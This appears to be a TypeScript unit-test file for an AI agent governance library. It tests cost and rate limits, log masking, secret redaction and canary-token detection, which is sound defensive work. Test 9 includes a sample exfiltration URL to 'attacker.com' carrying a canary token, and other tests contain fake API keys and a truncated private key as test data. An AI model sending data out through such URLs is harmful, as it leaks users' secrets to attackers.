import 'reflect-metadata';
import { CostLimitPolicy, LoggingPolicy, RateLimitPolicy } from '../src';
import type { AgentContext } from '../src';

export async function runPolicyTests() {
  console.log('⚖️ Running Advanced Governance Policies Unit Tests...\n');

  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, testName: string, detail?: string) {
    if (condition) {
      console.log(`  ✅ PASS: ${testName}`);
      passed++;
    } else {
      console.error(`  ❌ FAIL: ${testName} ${detail ? `(${detail})` : ''}`);
      failed++;
    }
  }

  const dummyCtx: AgentContext = {
    sessionId: 'sess_policy',
    traceId: 'trace_policy',
    security: { userId: 'usr_buyer', tenantId: 'acme' },
  };

  // TEST 1: CostLimitPolicy Thresholds
  try {
    const policy = new CostLimitPolicy({
      paramName: 'amount',
      autoAllowLimit: 500,
      approvalLimit: 5000,
    });

    const res1 = await policy.evaluate(dummyCtx, 'transfer', { amount: 300 });
    assert(res1.decision === 'allow', 'Test 1a: Amount $300 is auto-allowed');

    const res2 = await policy.evaluate(dummyCtx, 'transfer', { amount: 1500 });
    assert(res2.decision === 'require_approval', 'Test 1b: Amount $1500 requires approval');

    const res3 = await policy.evaluate(dummyCtx, 'transfer', { amount: 10000 });
    assert(res3.decision === 'deny', 'Test 1c: Amount $10000 exceeds safety threshold and is denied');
  } catch (err: any) {
    assert(false, 'Test 1: CostLimitPolicy Thresholds', err.message);
  }

  // TEST 2: RateLimitPolicy Evaluation
  try {
    const ratePolicy = new RateLimitPolicy({ maxCallsPerMinute: 3 });
    const toolName = 'rateLimitedAction';

    const r1 = await ratePolicy.evaluate(dummyCtx, toolName, {});
    const r2 = await ratePolicy.evaluate(dummyCtx, toolName, {});
    const r3 = await ratePolicy.evaluate(dummyCtx, toolName, {});
    assert(
      r1.decision === 'allow' && r2.decision === 'allow' && r3.decision === 'allow',
      'Test 2a: First 3 tool calls allowed within limit',
    );

    const r4 = await ratePolicy.evaluate(dummyCtx, toolName, {});
    assert(
      r4.decision === 'deny' && r4.reason.includes('Rate limit exceeded'),
      'Test 2b: 4th tool call denied due to rate limit threshold',
    );
  } catch (err: any) {
    assert(false, 'Test 2: RateLimitPolicy Evaluation', err.message);
  }

  // TEST 3: LoggingPolicy Basic Functionality
  try {
    let loggedMessage = '';
    let loggedData: Record<string, unknown> = {};
    const customLogger = (message: string, data: Record<string, unknown>) => {
      loggedMessage = message;
      loggedData = data;
    };

    const loggingPolicy = new LoggingPolicy({
      logLevel: 'debug',
      includeArgs: true,
      includeContext: true,
      logger: customLogger,
    });

    const result = await loggingPolicy.evaluate(dummyCtx, 'testTool', { arg1: 'value1', arg2: 42 });
    assert(result.decision === 'allow', 'Test 3a: LoggingPolicy always returns allow');
    assert(loggedMessage === '[Tool Execution] testTool', 'Test 3b: Correct log message format');
    assert(loggedData.toolName === 'testTool', 'Test 3c: Tool name logged correctly');
    assert(loggedData.sessionId === 'sess_policy', 'Test 3d: Session ID logged correctly');
    assert(loggedData.traceId === 'trace_policy', 'Test 3e: Trace ID logged correctly');
    assert(loggedData.userId === 'usr_buyer', 'Test 3f: User ID logged when includeContext=true');
    assert(loggedData.tenantId === 'acme', 'Test 3g: Tenant ID logged when includeContext=true');
  } catch (err: any) {
    assert(false, 'Test 3: LoggingPolicy Basic Functionality', err.message);
  }

  // TEST 4: LoggingPolicy Sensitive Field Masking
  try {
    let loggedData: Record<string, unknown> = {};
    const loggingPolicy = new LoggingPolicy({
      sensitiveFields: ['password', 'apiKey'],
      logger: (_message: string, data: Record<string, unknown>) => {
        loggedData = data;
      },
    });

    const args = {
      username: 'john',
      password: 'secret123',
      apiKey: 'key_abc123',
      amount: 100,
    };

    await loggingPolicy.evaluate(dummyCtx, 'authenticate', args);
    const sanitizedArgs = loggedData.args as Record<string, unknown>;
    assert(sanitizedArgs.username === 'john', 'Test 4a: Non-sensitive field logged as-is');
    assert(sanitizedArgs.password === '***REDACTED***', 'Test 4b: Password field redacted');
    assert(sanitizedArgs.apiKey === '***REDACTED***', 'Test 4c: API key field redacted');
    assert(sanitizedArgs.amount === 100, 'Test 4d: Other fields remain intact');
  } catch (err: any) {
    assert(false, 'Test 4: LoggingPolicy Sensitive Field Masking', err.message);
  }

  // TEST 5: LoggingPolicy with includeArgs and includeContext disabled
  try {
    let loggedData: Record<string, unknown> = {};
    const loggingPolicy = new LoggingPolicy({
      includeArgs: false,
      includeContext: false,
      logger: (_message: string, data: Record<string, unknown>) => {
        loggedData = data;
      },
    });

    await loggingPolicy.evaluate(dummyCtx, 'minimalLog', { arg1: 'value' });
    assert(loggedData.args === undefined, 'Test 5a: Args not logged when includeArgs=false');
    assert(loggedData.userId === undefined, 'Test 5b: User ID not logged when includeContext=false');
    assert(loggedData.tenantId === undefined, 'Test 5c: Tenant ID not logged when includeContext=false');
    assert(loggedData.toolName === 'minimalLog', 'Test 5d: Tool name still logged');
    assert(loggedData.sessionId === 'sess_policy', 'Test 5e: Session ID still logged');
  } catch (err: any) {
    assert(false, 'Test 5: LoggingPolicy with includeArgs and includeContext disabled', err.message);
  }

  // TEST 6: LoggingPolicy nested object sanitization
  try {
    let loggedData: Record<string, unknown> = {};
    const loggingPolicy = new LoggingPolicy({
      sensitiveFields: ['secret'],
      logger: (_message: string, data: Record<string, unknown>) => {
        loggedData = data;
      },
    });

    const args = {
      user: {
        name: 'Alice',
        secret: 'hidden',
      },
      publicData: 'visible',
    };

    await loggingPolicy.evaluate(dummyCtx, 'nestedTest', args);
    const sanitizedArgs = loggedData.args as Record<string, any>;
    assert(sanitizedArgs.publicData === 'visible', 'Test 6a: Top-level public field intact');
    assert(sanitizedArgs.user.name === 'Alice', 'Test 6b: Nested non-sensitive field intact');
    assert(sanitizedArgs.user.secret === '***REDACTED***', 'Test 6c: Nested sensitive field redacted');
  } catch (err: any) {
    assert(false, 'Test 6: LoggingPolicy nested object sanitization', err.message);
  }

  // TEST 7: SecretRedactionPolicy String Pattern Redaction
  try {
    const { SecretRedactionPolicy } = await import('../src/policies/secret-redaction.policy');
    const redactionPolicy = new SecretRedactionPolicy();

    const outputWithSecrets =
      'Found OpenAI key sk-abcdef123456789012345678 and GitHub token ghp_123456789012345678901234567890123456 on server.';
    const result = await redactionPolicy.evaluateOutput(dummyCtx, 'fetchLog', outputWithSecrets);

    assert(result.decision === 'sanitize', 'Test 7a: Output containing secrets is flagged for sanitization');
    if (result.decision === 'sanitize') {
      const sanitized = result.sanitizedResult as string;
      assert(!sanitized.includes('sk-abcdef'), 'Test 7b: OpenAI secret key is redacted');
      assert(!sanitized.includes('ghp_123456'), 'Test 7c: GitHub PAT is redacted');
      assert(sanitized.includes('[REDACTED_SECRET]'), 'Test 7d: Mask placeholder is applied');
    }
  } catch (err: any) {
    assert(false, 'Test 7: SecretRedactionPolicy String Pattern Redaction', err.message);
  }

  // TEST 8: SecretRedactionPolicy Object Field Masking
  try {
    const { SecretRedactionPolicy } = await import('../src/policies/secret-redaction.policy');
    const redactionPolicy = new SecretRedactionPolicy();

    const userProfile = {
      username: 'agent_user',
      apiKey: 'secret_live_api_token_12345',
      profile: {
        password: 'my-super-secret-password',
        email: 'user@example.com',
      },
    };

    const result = await redactionPolicy.evaluateOutput(dummyCtx, 'getUser', userProfile);
    assert(result.decision === 'sanitize', 'Test 8a: Object containing sensitive keys is sanitized');
    if (result.decision === 'sanitize') {
      const sanitized = result.sanitizedResult as any;
      assert(sanitized.username === 'agent_user', 'Test 8b: Non-sensitive username is preserved');
      assert(sanitized.apiKey === '[REDACTED_SECRET]', 'Test 8c: apiKey field is masked');
      assert(sanitized.profile.password === '[REDACTED_SECRET]', 'Test 8d: Nested password is masked');
      assert(sanitized.profile.email === 'user@example.com', 'Test 8e: Non-sensitive email is preserved');
    }
  } catch (err: any) {
    assert(false, 'Test 8: SecretRedactionPolicy Object Field Masking', err.message);
  }

  // TEST 9: CanaryDetectionPolicy Prompt Exfiltration Interception
  try {
    const { CanaryDetectionPolicy } = await import('../src/policies/canary-detection.policy');
    const canaryPolicy = new CanaryDetectionPolicy({
      canaryTokens: ['CANARY_SECRET_TOKEN_999'],
    });

    // 9a: Input args containing canary token
    const leakedArgs = { url: 'https://attacker.com/leak?token=CANARY_SECRET_TOKEN_999' };
    const evalInput = await canaryPolicy.evaluate(dummyCtx, 'sendHttp', leakedArgs);
    assert(evalInput.decision === 'deny', 'Test 9a: Attempt to leak canary token in tool arguments is blocked');

    // 9b: Output containing canary token
    const leakedOutput = 'Third-party response with CANARY_SECRET_TOKEN_999 in payload';
    const evalOutput = await canaryPolicy.evaluateOutput(dummyCtx, 'scrapeWeb', leakedOutput);
    assert(evalOutput.decision === 'deny', 'Test 9b: Tool output reflecting canary token is blocked');

    // 9c: Clean execution without canary
    const cleanOutput = 'Normal system status: OK';
    const evalClean = await canaryPolicy.evaluateOutput(dummyCtx, 'getStatus', cleanOutput);
    assert(evalClean.decision === 'allow', 'Test 9c: Clean output without canary token is allowed');
  } catch (err: any) {
    assert(false, 'Test 9: CanaryDetectionPolicy Prompt Exfiltration Interception', err.message);
  }

  // TEST 10: PEM Private Key Regex Redaction
  try {
    const { SecretRedactionPolicy } = await import('../src/policies/secret-redaction.policy');
    const redactionPolicy = new SecretRedactionPolicy();

    const pemKey = `Config loaded with key:
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Y1+abcdef123456789==
-----END RSA PRIVATE KEY-----
Connection ready.`;

    const result = await redactionPolicy.evaluateOutput(dummyCtx, 'loadKey', pemKey);
    assert(result.decision === 'sanitize', 'Test 10a: PEM private key is detected and flagged for sanitization');
    if (result.decision === 'sanitize') {
      const sanitized = result.sanitizedResult as string;
      assert(!sanitized.includes('MIIEowIBAAKCAQEA'), 'Test 10b: Private key body is redacted');
      assert(sanitized.includes('[REDACTED_SECRET]'), 'Test 10c: Mask placeholder is applied to PEM block');
    }
  } catch (err: any) {
    assert(false, 'Test 10: PEM Private Key Regex Redaction', err.message);
  }

  // TEST 11: Circular Reference Traversal Protection
  try {
    const { SecretRedactionPolicy } = await import('../src/policies/secret-redaction.policy');
    const { CanaryDetectionPolicy } = await import('../src/policies/canary-detection.policy');

    const redactionPolicy = new SecretRedactionPolicy();
    const canaryPolicy = new CanaryDetectionPolicy({ canaryTokens: ['TRAP_CANARY_123'] });

    // Construct circular object
    const circularObj: any = {
      name: 'node_a',
      apiKey: 'sk-secret-key-12345678901234567890',
    };
    circularObj.self = circularObj;

    // 11a: SecretRedactionPolicy handles circular reference without infinite loop and without leaking original object
    const redactResult = await redactionPolicy.evaluateOutput(dummyCtx, 'getGraph', circularObj);
    assert(redactResult.decision === 'sanitize', 'Test 11a: Circular object is processed safely without stack overflow');
    if (redactResult.decision === 'sanitize') {
      const sanitized = redactResult.sanitizedResult as any;
      assert(sanitized.apiKey === '[REDACTED_SECRET]', 'Test 11b: Secret key in circular object is masked');
      assert(sanitized.self === sanitized, 'Test 11c: Circular reference points strictly to sanitized clone');
      assert(sanitized.self.apiKey === '[REDACTED_SECRET]', 'Test 11d: Nested circular access is also masked');
      assert(sanitized !== circularObj, 'Test 11e: Sanitized object does not retain reference to original unredacted object');
    }

    // 11b: CanaryDetectionPolicy handles circular reference without infinite loop
    const canaryResult = await canaryPolicy.evaluateOutput(dummyCtx, 'getGraph', circularObj);
    assert(canaryResult.decision === 'allow', 'Test 11f: Canary detection processes circular object without loop');
  } catch (err: any) {
    assert(false, 'Test 11: Circular Reference Traversal Protection', err.message);
  }

  console.log(`\n  📊 Policies Test Results: ${passed} passed, ${failed} failed.\n`);
  if (failed > 0) {
    throw new Error('Policy Unit Tests Failed');
  }
}

if (require.main === module) {
  runPolicyTests().catch(() => process.exit(1));
}
